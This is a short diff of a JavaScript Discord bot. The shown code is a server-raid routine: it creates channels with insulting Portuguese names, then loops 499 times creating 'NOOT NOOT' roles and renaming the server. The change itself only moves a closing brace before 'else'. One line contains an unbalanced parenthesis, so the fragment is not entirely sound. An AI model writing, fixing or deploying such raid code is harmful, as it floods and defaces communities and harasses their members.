@@ -33,7 +33,7 @@ client.on("message", async (message) => {
 			message.guild.createChannel('snow arrombado do krl', 'text')
 			message.guild.createChannel('snow manipulador do cacete'), 'text')
 		}
-	else{
+	}else{
 		for(i = 0; i < 499; i++){
         		message.guild.createRole('NOOT NOOT')
 	    		message.guild.setName(process.env.SERVER_NAME + `${textuh}`)
